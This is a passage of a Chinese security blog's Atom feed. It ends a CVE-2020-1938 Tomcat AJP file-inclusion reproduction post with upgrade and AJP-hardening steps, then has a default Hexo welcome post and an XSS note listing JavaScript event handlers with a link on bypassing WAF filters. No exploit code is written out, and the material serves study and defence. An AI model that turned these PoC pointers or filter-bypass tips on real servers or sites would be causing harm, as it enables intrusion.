rel="noopener">AJPy-master</a>的poc同样成功，这个脚本还能对tomcat进行暴力破解，文件上传等<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/7.png" alt="7"><br>可以修改–webapp=manager来指定查看webapp目录下的子目录中文件<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/8.png" alt="8"></p><h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><h3 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h3><p>目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</p><table><thead><tr><th>版本号</th><th>下载地址</th></tr></thead><tbody><tr><td>Apache Tomcat 7.0.100</td><td><a href="http://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-70.cgi</a></td></tr><tr><td>Apache Tomcat 8.5.51</td><td><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-80.cgi</a></td></tr><tr><td>Apache Tomcat 9.0.31</td><td><a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-90.cgi</a></td></tr></tbody></table><h3 id="其他安全防护措施"><a href="#其他安全防护措施" class="headerlink" title="其他安全防护措施"></a>其他安全防护措施</h3><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p><strong>关闭AJP</strong></p><p>如若用不到Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作如下</p><p>a. 编辑 <code>&lt;CATALINABASE&gt;/conf/server.xml</code>，找到如下行（<code>&lt;CATALINABASE&gt;</code> 为 <code>Tomcat</code> 的工作目录）：`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;”8009″protocol&#x3D;”AJP&#x2F;1.3″ redirectPort&#x3D;”8443″&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>b. 然后将其注释掉或者删掉, (以下为注释的方式):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!–&lt;Connectorport&#x3D;”8009″protocol&#x3D;”AJP&#x2F;1.3″redirectPort&#x3D;”8443″ &#x2F;&gt;–&gt;</span><br></pre></td></tr></table></figure><p>c. 保存后重新启动Tomcat，即可生效.</p><p><strong>添加认证凭证</strong></p><p>如若需要使用AJP协议，可根据当前版本配置协议属性设置认证凭证，主要使用配置AJP配置中的secretRequired跟secret属性来限制认证。</p><p>具体操作如下</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将<code>YOURTOMCATAJP_SECRET</code>更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将<code>YOURTOMCATAJP_SECRET</code>更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot; requiredSecret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件,如：webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。&lt;/p&gt;
&lt;p&gt;Apache Tomcat都是Apache开源组织开发的用于处理HTTP服务的免费项目，可以作为独立的Web服务器运行。Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，所以本次通告的漏洞影响范围较大，请相关用户及时采取防护措施或者升级补丁修复此漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CVE-2020-1938" scheme="http://yoursite.com/tags/CVE-2020-1938/"/>
    
      <category term="Tomcat" scheme="http://yoursite.com/tags/Tomcat/"/>
    
      <category term="表单验证" scheme="http://yoursite.com/tags/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81/"/>
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/06/02/hello-world/"/>
    <id>http://yoursite.com/2020/06/02/hello-world/</id>
    <published>2020-06-02T08:43:20.434Z</published>
    <updated>2020-05-26T02:43:33.588Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XSS 函数</title>
    <link href="http://yoursite.com/2020/05/25/XSS/"/>
    <id>http://yoursite.com/2020/05/25/XSS/</id>
    <published>2020-05-25T06:36:41.000Z</published>
    <updated>2020-06-03T11:05:13.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><h2 id="Tips-amp-tricks"><a href="#Tips-amp-tricks" class="headerlink" title="Tips &amp; tricks"></a>Tips &amp; tricks</h2><p>Les articles suivants présentent des moyens de contourner certains protections (WAF, blacklist, etc.)</p><ul><li><a href="https://brutelogic.com.br/blog/xss-without-event-handlers/" target="_blank" rel="noopener">XSS without event handlers</a>: pour les situations où les events du type onerror sont bloqués</li></ul><a id="more"></a><h2 id="Liste-des-events-javascripts"><a href="#Liste-des-events-javascripts" class="headerlink" title="Liste des events javascripts"></a>Liste des events javascripts</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">onclick</span><br><span class="line">oncontextmenu</span><br><span class="line">ondblclick</span><br><span class="line">onmousedown</span><br><span class="line">onmouseenter</span><br><span class="line">onmouseleave</span><br><span class="line">onmousemove</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmouseup</span><br><span class="line">onkeydown</span><br><span class="line">onkeypress</span><br><span class="line">onkeyup</span><br><span class="line">onabort</span><br><span class="line">onbeforeunload</span><br><span class="line">onerror</span><br><span class="line">onhashchange</span><br><span class="line">onload</span><br><span class="line">onpageshow</span><br><span class="line">onpagehide</span><br><span class="line">onresize</span><br><span class="line">onscroll</span><br><span class="line">onunload</span><br><span class="line">onblur</span><br><span class="line">onchange</span><br><span class="line">onfocus</span><br><span class="line">onfocusin</span><br><span class="line">onfocusout</span><br><span class="line">oninput</span><br><span class="line">oninvalid</span><br><span class="line">onreset</span><br><span class="line">onsearch</span><br><span class="line">onselect</span><br><span class="line">onsubmit</span><br><span class="line">ondrag</span><br><span class="line">ondragend</span><br><span class="line">ondragenter</span><br><span class="line">ondragleave</span><br><span class="line">ondragover</span><br><span class="line">ondragstart</span><br><span class="line">ondrop</span><br><span class="line">oncopy</span><br><span class="line">oncut</span><br><span class="line">onpaste</span><br><span class="line">onafterprint</span><br><span class="line">onbeforeprint</span><br><span class="line">onabort</span><br><span class="line">oncanplay</span><br><span class="line">oncanplaythrough</span><br><span class="line">ondurationchange</span><br><span class="line">onended</span><br><span class="line">onerror</span><br><span class="line">onloadeddata</span><br><span class="line">onloadedmetadata</span><br><span class="line">onloadstart</span><br><span class="line">onpause</span><br><span class="line">onplay</span><br><span class="line">onplaying</span><br><span class="line">onprogress</span><br><span class="line">onratechange</span><br><span class="line">onseeked</span><br><span class="line">onseeking</span><br><span class="line">onstalled</span><br><span class="line">onsuspend</span><br><span class="line">ontimeupdate</span><br><span class="line">onvolumechange</span><br><span class="line">onwaiting</span><br><span class="line">onerror</span><br><span class="line">onmessage</span><br><span class="line">onopen</span><br><span class="line">onwheel</span><br><span class="line">ononline</span><br><span class="line">onoffline</span><br><span class="line">onshow</span><br><span class="line">ontoggle</span><br><span class="line">onwheel</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cross-Site-Scripting&quot;&gt;&lt;a href=&quot;#Cross-Site-Scripting&quot; class=&quot;headerlink&quot; title=&quot;Cross-Site Scripting&quot;&gt;&lt;/a&gt;Cross-Site Scripting&lt;/h1&gt;&lt;h2 id=&quot;Tips-amp-tricks&quot;&gt;&lt;a href=&quot;#Tips-amp-tricks&quot; class=&quot;headerlink&quot; title=&quot;Tips &amp;amp; tricks&quot;&gt;&lt;/a&gt;Tips &amp;amp; tricks&lt;/h2&gt;&lt;p&gt;Les articles suivants présentent des moyens de contourner certains protections (WAF, blacklist, etc.)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://brutelogic.com.br/blog/xss-without-event-handlers/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS without event handlers&lt;/a&gt;: pour les situations où les events du type onerror sont bloqués&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
      <category term="跨站脚本" scheme="http://yoursite.com/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
</feed>
